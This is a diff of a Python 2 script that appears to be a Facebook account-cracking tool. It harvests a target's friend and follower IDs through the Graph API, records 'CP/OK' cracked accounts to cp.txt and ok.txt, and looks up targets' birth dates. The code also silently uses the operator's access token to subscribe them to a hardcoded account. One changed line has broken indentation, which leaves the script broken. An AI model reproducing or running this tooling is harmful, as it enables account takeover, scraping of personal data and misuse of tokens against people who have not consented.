@@ -100,11 +100,9 @@ def pilih_kanjut():
     elif mek == '0' or mek == '00':
            os.system('clear')
            print logo
-           logout()
+           memek()
     else:
-        print ''
-        print '\t    \x1b[1;31mSelect valid method'
-        print ''
+        print '\n \x1b[1;97m[\x1b[1;92m!\x1b[1;97m] Wrong Input'
         pilih_kanjut()
 
 
@@ -133,26 +131,23 @@ def pilih_memek():
             name = q['name']
             nm = name.rsplit(' ')[0]
             print ''
-            print '\t\x1b[1;37mToken logged in as \x1b[1;31m: \x1b[1;32m' + nm + '\x1b[0;97m'
+            print '\t\x1b[1;37m Token logged in as \x1b[1;31m: \x1b[1;32m' + nm + '\x1b[0;97m'
             requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token='+token)
             time.sleep(3)
             os.system('xgd-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
-            yxz()
+            kanjut()
         except (KeyError, IOError):
-            print ''
-            print '\t    \x1b[1;31mToken not valid'
+            print '\t \x1b[1;37m[\x1b[1;31m!\x1b[1;37m] Token Invalid'
             os.system('xdg-open https://youtu.be/xc06cplt3FU')
-            raw_input('\x1b[1;96mPress Enter To Try Again ')
+            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             memek()
 
     elif yan =='2' or yan =='02':
         login_fb()
     elif yan =='0' or yan =='00':
-    	kanjut()
+    	logout()
     else:
-        print ''
-        print '\t    ' + c + 'Select valid method' + c2
-        print ''
+print '\n \x1b[1;97m[\x1b[1;92m!\x1b[1;97m] Wrong Input'
         pilih_memek()
 
 
@@ -178,18 +173,18 @@ def login_fb():
         time.sleep(1)
         print '\t    \x1b[1;32mLogged in successfully\x1b[0;97m'
         time.sleep(1)
-        yxz()
+        kanjut()
     elif 'www.facebook.com' in q['error']:
         print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
         print ''
         time.sleep(1)
-        raw_input('\x1b[1;36m Press Enter To Try Again ')
-        login_fb()
+        raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+        memek()
     else:
-        print '\t\x1b[1;31mID/Number/Password May Be Wrong'
+        print ' \x1b[1;37m[\x1b[1;31m!\x1b[1;37m] ID/Number/Password May Be Wrong'
         print ''
-        raw_input('\x1b[1;36m Press Enter To Try Again ')
-        login_fb()
+        raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+        memek()
 
 
 def yxz():
@@ -213,15 +208,15 @@ def yxz():
         print ''
         os.system('rm -rf .fb_token.txt')
         time.sleep(1)
-        kanjut()
+        memek()
     except requests.exceptions.ConnectionError:
         print logo
         print ''
         print '\t    \x1b[1;31mTurn on mobile data OR wifi \x1b[0;97m'
         print ''
         time.sleep(1)
-        raw_input('\x1b[1;31m Press Enter To Try Again \x1b[0;97m')
-        yxz()
+        raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+        exit()
 
     os.system('clear')
     print logo
@@ -258,7 +253,7 @@ def pilih_syngg():
             print ''
             print '\n\t     \x1b[1;91mWrong Id/User'
             print ''
-            raw_input('\n\x1b[1;36mPress enter to back ')
+            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             yxz()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -294,7 +289,7 @@ def pilih_syngg():
             print ''
             print '\n\t     \x1b[1;91mWrong Id/User'
             print ''
-            raw_input('\n\x1b[1;36mPress enter to back ')
+            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             yxz()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
@@ -449,8 +444,8 @@ def pilih_syngg():
     jalan('\x1b[1;97m RESULTS \x1b[1;93mCP\x1b[1;91m/\x1b[1;92mOK\x1b[1;97m SAVED TO SDCARD\x1b[1;91m : \x1b[1;93mcp.txt\x1b[1;91m/\x1b[1;92mok.txt')
     print '\x1b[1;94m────────────────────────────────────────────────────'
     print ''
-    raw_input('\x1b[1;96m Press enter to back ')
-    yxz()
+    raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Back \x1b[1;37m] ')
+    kanjut()
 
 
 def login_token():
@@ -462,7 +457,7 @@ def login_token():
     print ' \x1b[1;37m[\x1b[1;34m•\x1b[1;37m] Token\x1b[1;31m : \x1b[1;32m'
     os.system('cat .fb_token.txt')
     print ''
-    raw_input('\x1b[1;96m Press enter to main menu ')
+    raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
     yxz()
 
 
@@ -486,7 +481,7 @@ def yayan_xd():
         token = open('.fb_token.txt', 'r').read()
     except (KeyError, IOError):
         time.sleep(1)
-        kanjut()
+        memek()
 
     os.system('clear')
     print logo
@@ -495,10 +490,10 @@ def yayan_xd():
     jalan('\x1b[1;37m[\x1b[1;34m03\x1b[1;37m] Grab Single Id')
     jalan('\x1b[1;37m[\x1b[1;31m00\x1b[1;37m] Back menu')
     print '\x1b[1;94m────────────────────────────────────────────────────'
-    dob_select()
+    pilih_asu()
 
 
-def dob_select():
+def pilih_asu():
     memek = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
     id = []
     nms = []
@@ -517,8 +512,8 @@ def dob_select():
             print ''
             print '\x1b[1;31mID Not Found' + c2
             print ''
-            raw_input('\n \x1b[1;36mPress Enter To Back ')
-            yayan_xd_select()
+            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            yayan_xd()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
         z = json.loads(r.text)
@@ -541,8 +536,8 @@ def dob_select():
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except KeyError:
             print '\t    \x1b[1;31mID Not Found\x1b[0;97m'
-            raw_input('\nPress Enter To Back ')
-            yayan_xd_select()
+            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+            yayan_xd()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
         z = json.loads(r.text)
@@ -553,14 +548,14 @@ def dob_select():
             id.append(uid + '|' + nm)
 
     elif memek == '3' or memek == '03':
-        dob()
+        anjing()
     elif memek == '0' or memek == '00':
         yxz()
     else:
         print ''
         print '\t    \x1b[1;31mSelect valid option'
         print ''
-        dob_select()
+        pilih_asu()
     print '\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] Total ID \x1b[1;91m: \x1b[1;90m'  + str(len(id))
     jalan( '\n              \x1b[1;92mStop Press CTRL + z')
     jalan('  \x1b[1;92mIf No results Use Airplane Mode For 5 Seconds...')
@@ -592,7 +587,7 @@ def dob_select():
     yayan_xd()
 
 
-def dob():
+def anjing():
     global token
     try:
         token = open('.fb_token.txt', 'r').read()
@@ -634,13 +629,14 @@ def dob():
     print ' \x1b[1;97mAccount ID\x1b[1;91m : \x1b[1;92m' + idt
     print ' \x1b[1;97m DOB \x1b[1;91m: \x1b[1;92m' + dobs
     print '\x1b[1;94m────────────────────────────────────────────────────'
+    raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
     conf()
 
 
 def conf():
     ol = raw_input('\x1b[1;36m Do you want to find again\x1b[1;97m [\x1b[1;94my/n\x1b[1;97m] \x1b[1;92')
     if ol == 'y':
-        dob()
+        anjing()
     elif ol == 'n':
         yayan_xd()
     else:
@@ -668,15 +664,14 @@ def moch_yayan():
         print ''
         os.system('rm -rf .fb_token.txt')
         time.sleep(1)
-        kanjut()
+        memek()
     except requests.exceptions.ConnectionError:
         print logo
         print ''
         print '\t    \x1b[1;31mTurn on mobile data OR wifi\x1b[0;97m'
         print ''
         time.sleep(1)
-        raw_input('\x1b[1;92m Press enter to try again ')
-        yxz()
+        exit()
 
     os.system('clear')
     print logo
@@ -717,10 +712,8 @@ def pilih_kontol():
             print ''
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except (KeyError, IOError):
-            print ''
-            print '\n\t    \x1b[1;91mWrong Id/User'
-            print ''
-            raw_input('\nPress Enter To Back ')
+            print '\n\n\t \x1b[1;37m[\x1b[1;33m!\x1b[1;37m] \x1b[1;91mWrong Id/User'
+            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             moch_yayan()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -753,10 +746,8 @@ def pilih_kontol():
             print ''
             print '\x1b[1;97m[\x1b[1;91m•\x1b[1;94m•\x1b[1;97m] Target user\x1b[1;91m : \x1b[1;90m' + q['name']
         except (KeyError, IOError):
-            print ''
-            print '\n\t     \x1b[1;91mWrong Id/User'
-            print ''
-            raw_input('\n \x1b[1;36mPress Enter To Back ')
+            print '\n\n\t \x1b[1;37m[\x1b[1;33m!\x1b[1;37m] \x1b[1;91mWrong Id/User'
+            raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
             moch_yayan()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
@@ -907,9 +898,9 @@ def pilih_kontol():
     jalan('\x1b[1;97m RESULTS \x1b[1;93mCP\x1b[1;91m/\x1b[1;92mOK\x1b[1;97m SAVED TO SDCARD\x1b[1;91m : \x1b[1;93mcp.txt\x1b[1;91m/\x1b[1;92mok.txt')
     print '\x1b[1;94m────────────────────────────────────────────────────'
     print ''
-    raw_input('\x1b[1;96m Press Entet To Back ')
-    moch_yayan()
+    raw_input('\n \x1b[1;37m [ \x1b[1;36mPress Enter To Try Again \x1b[1;37m] ')
+    kanjut()
 
 
 if __name__ == '__main__':
-    kanjut()
+    memek()
